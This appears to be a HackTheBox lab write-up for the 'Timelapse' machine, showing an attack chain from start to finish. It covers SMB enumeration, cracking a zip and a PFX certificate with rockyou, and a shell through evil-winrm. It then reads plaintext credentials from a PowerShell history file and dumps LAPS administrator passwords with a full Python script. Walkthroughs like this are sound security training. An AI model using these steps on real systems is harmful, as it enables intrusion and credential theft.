---
permalink: /htb/timelapse
title: Timelapse
---

<br>

Small note: when using the UDP VPN sever I could not ping the machine but TCP worked. 

As always, begin with nmap:

```
[connor@fedora ~]$ nmap 10.10.11.152 -A
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-18 20:15 AEST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.64 seconds
[connor@fedora ~]$ nmap 10.10.11.152 -A -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-18 20:15 AEST
Nmap scan report for 10.10.11.152
Host is up (0.067s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-18 18:15:48Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-06-18T18:15:56
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.62 seconds
```

<br>

Note the SMB protocol - we can enumerate it with [smbmap](https://github.com/ShawnDEvans/smbmap):

<br>

```
[connor@fedora smbmap]$ python smbmap.py -H 10.10.11.152 -u guest

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com   
                     https://github.com/ShawnDEvans/smbmap

                                                                                                    
[+] IP: 10.10.11.152:445        Name: 10.10.11.152              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Shares                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
```

<br>

Next let's try access the READ ONLY disks.

<br>

```
[connor@fedora timelapse]$ smbclient //10.10.11.152/Shares
Password for [SAMBA\connor]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Oct 26 01:39:15 2021
  ..                                  D        0  Tue Oct 26 01:39:15 2021
  Dev                                 D        0  Tue Oct 26 05:40:06 2021
  HelpDesk                            D        0  Tue Oct 26 01:48:42 2021

                6367231 blocks of size 4096. 2442478 blocks available
smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Tue Oct 26 05:40:06 2021
  ..                                  D        0  Tue Oct 26 05:40:06 2021
  winrm_backup.zip                    A     2611  Tue Oct 26 01:46:42 2021

                6367231 blocks of size 4096. 2442478 blocks available
smb: \Dev\> get winrm_backup.zip 
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (7.3 KiloBytes/sec) (average 7.3 KiloBytes/sec)
smb: \Dev\> ^C
[connor@fedora timelapse]$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
```

<br>

We find a password protected zip file. <br>

I used [fcrackzip](https://github.com/foreni-packages/fcrackzip) and rockyou:

<br>

```
[connor@fedora timelapse]$ time fcrackzip -D -u winrm_backup.zip -p rockyou.txt
sh: -c: line 1: unexpected EOF while looking for matching `"'
sh: -c: line 2: syntax error: unexpected end of file
sh: -c: line 1: unexpected EOF while looking for matching `"'
sh: -c: line 2: syntax error: unexpected end of file
sh: -c: line 1: unexpected EOF while looking for matching ``'
sh: -c: line 2: syntax error: unexpected end of file


PASSWORD FOUND!!!!: pw == supremelegacy

real    1m3.700s
user    0m21.971s
sys     0m39.765s
```

<br>

Now we can open it: 

<br>

```
[connor@fedora timelapse]$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx    
[connor@fedora timelapse]$ l
legacyy_dev_auth.pfx  rockyou.txt  winrm_backup.zip
```

<br>

It contains a pfx file. I didn't know what it was so I googled it: <https://www.google.com/search?q=pfx+file&oq=pfx+file> <br>
Then the first link told me how to extract private key and cert:

<br>

```
[connor@fedora timelapse]$ openssl pkcs12 -in legacyy_dev_auth.pfx
Enter Import Password:
```

<br>

But again it is password protected. <br>
I followed this to install johntheripper: <https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL-FEDORA> <br>
Then managed to get the password: thuglegacy

<br>

```
[connor@fedora timelapse]$ python ~/Public/john/run/pfx2john.py legacyy_dev_auth.pfx > pfx_hash
[connor@fedora timelapse]$ time john -w=rockyou.txt pfx_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:03:03 DONE (2022-06-18 22:14) 0.005438g/s 17574p/s 17574c/s 17574C/s thuglife03282006..thug209
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

real    3m4.115s
user    10m9.072s
sys     0m2.833s
```

<br>

Now we have the private key and cert:

<br>

```
[connor@fedora timelapse]$ openssl pkcs12 -in legacyy_dev_auth.pfx
Enter Import Password:
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90 
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFLTBXBgkqhkiG9w0BBQ0wSjApBgkqhkiG9w0BBQwwHAQI6d9buwyX/akCAggA
MAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBDZ2a/DUIOY98A9OPlMLf2ABIIE
0AWsmmfMVYTj1SL5zjiFOjG15Dy+eqZSmaf9IQB2ZrGd/fCzNrBJEe9eG0KKZM7K
RBKOyHB0PmeVSd4NEFLpaKVEfyHHPv/iOlAdNGf7WDHPQrmEtbBiarRIVrF73U5C
uirss9U8xvWIuHWQ4iAfYUve4o2+Pc73nzQ86tBewaMNy/7en8S6AscN5cQz8zNB
jpnjnMqC6kzlHtJK/76gfuaWmuoFz01VMVu8iEKPUlz95o7PJhLG8Qmddhpp9h4a
K2RhyoWu3zpMhr+LW23Opxvf18x8Zmmx97NKk20jbuT+CxgeZBJElEdKx0u1YdGc
MhU5hEq3Hxh+FzlVBCHVxQxqcbCy7B5gpj3LxOfAheaE80QgKIEs7kl0HC/GbqQe
xoamYjPopgvvmdH2OhOrlY01Tc1es3MNBJ3v25YrH09gFiHPb/QQrw06KDMubamT
5OVQ4ijKD5r0qVfGPtEienkvwv4RhefXeDuz9/Asfakkx392K9ectjc7Nh0xzUqH
jo4s6NbhX0quijaUzB3aIlt6mCabKgozR53D7w/9fACkh6A0h/VM5sJ5Fz33Lj+c
aTVcrfEp5s3xNC/pIUDr5F98R7mccmCjed1MGSBVXZgdGS8x0Gt+4GQX1kPYoq/o
1/eG/ZLJTox8095zdwq/nJLsZF4FGBovDEHo+A7ICERJ3jz8f/MCYp97wxdsjoDM
rUEwX3GL+8o79DU5E5CxCCCgZZ22qOMADvsVhq8HZti7mmpU3q2IzD2zCma035kN
UtSZcvqRZTLDPjl7L96aFZKqvrPY4hfmEy6xnp/Lx9aTVQ9CK7o5cJSTaHWmwWXC
rFg8f+5VNEsYm2mSEoC9hNiyqzqr0L1Opjwqq7gtjntqTdzXd8gjf7i+z9k7UbwS
HkAc8AYpa4aKR0jf+dwYjMabpbZtkrzAML9dAwfPBU0C/kF8WK+fEHYj9mvaWELc
miwZaMy9vRcTA8oLotEAU7Mk7luPbwIAGMqdpqgeifGLWbN42ziLGt+mGShTEXMG
6H0us6VNUlGxcM0OVxmTHWroS8OouH0vs0NYHsDRwj7MKG0MLgmGKpGfwGBIlfNa
k91dcxRVLxiu9+dk0nMV77MrgsNJdgOJW4EePl5pV7mTW60w2WEO1m8i3xXg8cjZ
0eSIapK1nm9ybDldeVzmjpNXtVmk1E+KWShpz8hGeubYca7uyPXmgkL1YVCMTiHd
rK2TZK+4G7+Yy65HF9NFpGxlCWsURZ8xQmN8ICW4ABdq4RgGNFc9zRJG3ne7EOXd
pYrvXD60x1Xe3qcOU57mFamTo3VbWtaVHu0gDTazi9Z0KOuawmPQRfx+GG1DGfIJ
lZeaqwfHa/jYF8mGY/fyE1I0Od8sEZ57aTuuFjy/eWl1Z2j4GqCF2JaIv8bShZPl
z3DjVuxiUn/qBHuThclD//kQpYxuX/Gu6UFCfkvlwxkn6wzQLoYjNGolCUffdy+k
kih/YyteSQWHp6QAg5wGUZd4NhGQKNJG8aR0l3ylZq4M7FjLaEs2d8HPMHyK+NHY
2RFh31JqXBERDEwWNsOt5kmcoHkl7hZMy9uYlEidShV/E9+MRS8kess+tGjRdKHZ
NNoe50krntrmROjsITpkRGujqUPqRy0mwEGALbi9oBJ3
-----END ENCRYPTED PRIVATE KEY-----
Bag Attributes
    localKeyID: 01 00 00 00 
subject=CN = Legacyy
issuer=CN = Legacyy
-----BEGIN CERTIFICATE-----
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
-----END CERTIFICATE-----
```

<br> 

Next I installed [evil-winrm](https://github.com/Hackplayers/evil-winrm) with

```
sudo dnf remove ruby && sudo dnf install ruby-devel
gem install evil-winrm
```

Again enter thuglegacy as password:

<br>

```
[connor@fedora timelapse]$ evil-winrm -S -k privkey -c cert -i 10.10.11.152

Evil-WinRM shell v3.4

Warning: SSL enabled

Info: Establishing connection to remote endpoint

Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Documents> 
```

<br>

And we're in :) <br>
Now for privesc.

<br>

```
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami /priv
Enter PEM pass phrase:

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

<br>

I used winPEAS - when the exe's don't work you can use the .bat

```
[connor@fedora timelapse]$ wget https://github.com/carlospolop/PEASS-ng/releases/download/20220612/winPEAS.bat
```

<br>

```
*Evil-WinRM* PS C:\Users\legacyy\Documents> upload winPEAS.bat
Info: Uploading winPEAS.bat to C:\Users\legacyy\Documents\winPEAS.bat

Enter PEM pass phrase:
                                                             
Data: 47928 bytes of 47928 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\legacyy\Documents> ./winPEAS.bat userinfo
```

<br>

Here's an extract from the output:

<br>

```
Checking PS history file
 Volume in drive C has no label.
 Volume Serial Number is 22CC-AE66

 Directory of C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

03/04/2022  12:46 AM               434 ConsoleHost_history.txt
               1 File(s)            434 bytes
               0 Dir(s)   9,944,387,584 bytes free
```

<br>

There are creds in the file:

<br>

```
*Evil-WinRM* PS C:\Users\legacyy\Documents> cat C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Enter PEM pass phrase:
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

<br>

Add `10.10.11.152 timelapse.htb` to /etc/hosts then we can use [laps.py](https://raw.githubusercontent.com/n00py/LAPSDumper/main/laps.py)

<br>

```
[connor@fedora timelapse]$ cat laps.py 
#!/usr/bin/env python3
from ldap3 import ALL, Server, Connection, NTLM, extend, SUBTREE
import argparse

parser = argparse.ArgumentParser(description='Dump LAPS Passwords')
parser.add_argument('-u','--username',  help='username for LDAP', required=True)
parser.add_argument('-p','--password',  help='password for LDAP (or LM:NT hash)',required=True)
parser.add_argument('-l','--ldapserver', help='LDAP server (or domain)', required=False)
parser.add_argument('-d','--domain', help='Domain', required=True)

def base_creator(domain):
    search_base = ""
    base = domain.split(".")
    for b in base:
        search_base += "DC=" + b + ","
    return search_base[:-1]


def main():
    args = parser.parse_args()
    if args.ldapserver:
        s = Server(args.ldapserver, get_info=ALL)
    else:
        s = Server(args.domain, get_info=ALL)
    c = Connection(s, user=args.domain + "\\" + args.username, password=args.password, authentication=NTLM, auto_bind=True)
    try:
        c.search(search_base=base_creator(args.domain), search_filter='(&(objectCategory=computer)(ms-MCS-AdmPwd=*))',attributes=['ms-MCS-AdmPwd','SAMAccountname'])
        for entry in c.entries:
                print (str(entry['sAMAccountName']) +":"+ str(entry['ms-Mcs-AdmPwd']))
    except Exception as ex:
        if ex.args[0] == "invalid attribute type ms-MCS-AdmPwd":
                print("This domain does not have LAPS configured")
        else:
                print(ex)

    
if __name__ == "__main__":
    main()
[connor@fedora timelapse]$ python laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb
DC01$:[},r9L86NT,/%+gE]).61X-9
```
